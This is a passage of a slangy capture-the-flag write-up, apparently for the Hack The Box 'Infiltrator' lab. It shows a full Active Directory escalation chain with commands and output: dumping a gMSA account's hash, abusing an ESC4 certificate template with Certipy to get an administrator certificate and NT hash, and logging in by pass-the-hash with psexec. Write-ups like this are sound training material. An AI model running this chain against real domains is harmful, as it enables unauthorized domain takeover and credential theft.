+<p>So now that we deep in this bish, rootin&#x27; around like cyber raccoons, we stumble on a shiny lil gem: the gMSA password for <code v-pre>infiltrator_svc$</code>. Yeah, you heard me—<strong>group managed service account</strong> type beat. The kind of account that&#x27;s like, “I rotate my password so you can’t get me,” but guess what? We got you, bozo.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/infiltrator/bh-lan.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>We ain&#x27;t talking basic creds here—this is like finding the keys to a vending machine <strong>and</strong> the cash drawer <strong>and</strong> the building it&#x27;s in. You ever seen Windows hand out secrets like this? This is that <em>you-left-your-safe-open-and-taped-the-combo-to-it</em> energy.</p>
+<p>How we do it? We just whisper real nice to AD, and it hands us the whole encrypted blob like:</p>
+<blockquote>
+<p>“Hey king, here&#x27;s the service account&#x27;s whole-ass credential. Don&#x27;t spend it all in one Kerberos.”</p>
+</blockquote>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ python gMSADumper.py -u 'lan_managment' -p 'l@n_M@an!1331' -d infiltrator.htb
+Users or groups who can read password for infiltrator_svc$:
+ &gt; lan_managment
+infiltrator_svc$:::9ae7de37439f359608eccf2cff5d32b9
+infiltrator_svc$:aes256-cts-hmac-sha1-96:efa1fa0fcbe57177f6f89d8513d16cbbb673ed8b85a137e5eb06baefdd3c0d27
+infiltrator_svc$:aes128-cts-hmac-sha1-96:4d556ec8ebc73e358d05430c7696f1f0</code></pre>
+</doc-codeblock></div>
+<p>One quick decrypt later and boom: password’s sittin’ in plaintext like it paid rent. Now <code v-pre>infiltrator_svc$</code> is ours to command. And with a gMSA under your belt? Bro, you’re not just in the network. <strong>You are</strong> the network.</p>
+<p>Let’s cook.</p>
+<doc-anchor-target id="certipy">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#certipy">#</doc-anchor-trigger>
+        <span>Certipy</span>
+    </h3>
+</doc-anchor-target>
+<p>We back on the grind and it’s time to hunt some <strong>ADCS</strong> sauce. Fire up that <strong>Certipy</strong> like it’s a radar gun pointed straight at Microsoft’s feelings.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ certipy find -u 'infiltrator_svc$@Infiltrator.htb' -hashes '9ae7de37439f359608eccf2cff5d32b9' -dc-ip 10.10.11.31
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Trying to get CA configuration for 'infiltrator-DC01-CA' via CSRA
+[!] Got error while trying to get CA configuration for 'infiltrator-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying to get CA configuration for 'infiltrator-DC01-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Got CA configuration for 'infiltrator-DC01-CA'
+[*] Saved BloodHound data to '20240907170709_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
+[*] Saved text output to '20240907170709_Certipy.txt'
+[*] Saved JSON output to '20240907170709_Certipy.json'
+</code></pre>
+</doc-codeblock></div>
+<p>JSON hits us back with that sweet, sweet <strong>ESC4</strong> vulnerability. And guess who’s got it? That’s right—<strong><code v-pre>INFILTRATOR.HTB\\infiltrator_svc</code></strong> out here holdin’ dangerous perms like it’s his mixtape. Now if you don’t know about ESC4—lemme hit you with the lore:</p>
+<blockquote>
+<p>ESC4 means our boi has <strong>write access to a certificate template</strong>. Which is basically like giving a random intern edit rights to the company’s security policy and just hopin’ for the best.</p>
+</blockquote>
+<p>We ain&#x27;t just playin&#x27; with fire, we out here installin’ a <em>gas line</em> to the template. Once we can overwrite the template’s settings, we just sprinkle a little bit of ESC1 dust on it (you know, <strong>allow client auth, no manager approval, enroll enabled, all that good good</strong>) and suddenly it’s not just a template anymore—it’s a ticket printer.</p>
+<p>And guess who’s standin’ in line for that golden cert? <strong>We are.</strong> This ain&#x27;t exploitation. This is straight-up <strong>admin cosplay</strong> with full privileges. Let’s go cook that cert and print ourselves a domain takeover, easy-bake oven style.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ certipy template -u 'infiltrator_svc$@Infiltrator.htb' -hashes '9ae7de37439f359608eccf2cff5d32b9' -target-ip infiltrator.htb -template 'Infiltrator_Template'
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Updating certificate template 'Infiltrator_Template'
+[*] Successfully updated 'Infiltrator_Template'
+
+$ certipy req -u 'infiltrator_svc$@Infiltrator.htb' -hashes '9ae7de37439f359608eccf2cff5d32b9' -target dc01.infiltrator.htb -ca 'infiltrator-DC01-CA' -template 'Infiltrator_Template' -upn 'administrator@infiltrator.htb'
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 10
+[*] Got certificate with UPN 'administrator@infiltrator.htb'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'
+
+$ certipy auth -pfx administrator.pfx -domain 'infiltrator.htb' -dc-ip 10.10.11.31
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@infiltrator.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@infiltrator.htb': aad3b435b51404eeaad3b435b51404ee:1356f502d2764368302ff0369b1121a1</code></pre>
+</doc-codeblock></div>
+<p>And just like that... We’re logged in as <strong>Administrator</strong>.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ psexec.py -hashes ':1356f502d2764368302ff0369b1121a1' administrator@10.10.11.31</code></pre>
+</doc-codeblock></div>
+<p>Box rooted. No password reset. No exploit chain. Just pure ACL wizardry and a cert with too much ambition. Time to stroll into <code v-pre>C:\Users\Administrator\Desktop</code>, pop open that <code v-pre>root.txt</code>, and whisper sweet nothings to the final flag.</p>
+<p><strong>GG. Game. Over</strong></p>
+
+                                
+                                <!-- Required only on API pages -->
+                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
+                            </div>
+                            <footer id="retype-content-footer" class="clear-both">
+                            
+                                <nav id="retype-nextprev" class="print:hidden flex mt-14">
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/hackthebox/machines/checker/">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                            <span>
+                                                <span class="block text-xs font-normal text-base-text-muted">Previous</span>
+                                                <span class="block mt-1">Checker (Hard)</span>
+                                            </span>
+                                        </a>
+                                    </div>
+                            
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/hackthebox/machines/office/">
+                                            <span>
+                                                <span class="block text-xs font-normal text-right text-base-text-muted">Next</span>
+                                                <span class="block mt-1">Office (Hard)</span>
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                        </a>
+                                    </div>
+                                </nav>
+                            </footer>
+                        </main>
+                
+                        <div id="retype-page-footer" class="print:border-none border-t border-base-border pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between print:justify-center">
+                                <div id="retype-footer-links" class="print:hidden">
+                                    <ul class="flex flex-wrap items-center text-sm">
+                                    </ul>
+                                </div>
+                                <div id="retype-copyright" class="print:justify-center py-2 text-footer-text font-footer-link-weight text-sm leading-relaxed"><p>© Copyright 2025. All rights reserved.</p></div>
+                            </footer>
+                        </div>
+                    </div>
+                
+                    <!-- Rendered if sidebar right is enabled -->
+                    <!-- Sidebar right skeleton-->
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-sidebar-right-bg border-sidebar-right-border lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton">
+                        <div class="pl-5">
+                            <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                        </div>
+                    </div>
+                
+                    <!-- User should be able to hide sidebar right -->
+                    <doc-sidebar-right v-cloak></doc-sidebar-right>
+                </div>
+
+            </div>
+        </div>
+    
+        <doc-search-mobile></doc-search-mobile>
+        <doc-back-to-top></doc-back-to-top>
+    </div>
+
+
+    <div id="retype-overlay-target"></div>
+
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Infiltrator (Insane)", level: 4, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+</body>
+</html>
